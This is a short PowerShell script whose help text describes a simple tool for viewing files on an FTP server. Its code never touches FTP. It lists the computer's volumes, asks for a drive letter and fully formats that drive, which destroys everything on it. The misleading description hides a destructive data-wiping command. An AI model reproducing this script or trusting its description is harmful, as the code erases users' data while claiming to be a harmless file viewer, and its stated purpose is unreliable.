<#

.SYNOPSIS
A Simple program that will show your files on your FTP Server.

.DESCRIPTION
This one is very helpful if you want to check a file on your FTP Server.

.NOTES
for the FTP host, dont forget to use the full path example is ftp://server.com/

.LINK


#>
Get-Volume | Format-Table -Autosize

$Volume = Read-Host -Prompt "Enter the Drive Letter:"

Format-Volume -DriveLetter $Volume -FileSystem NTFS -Full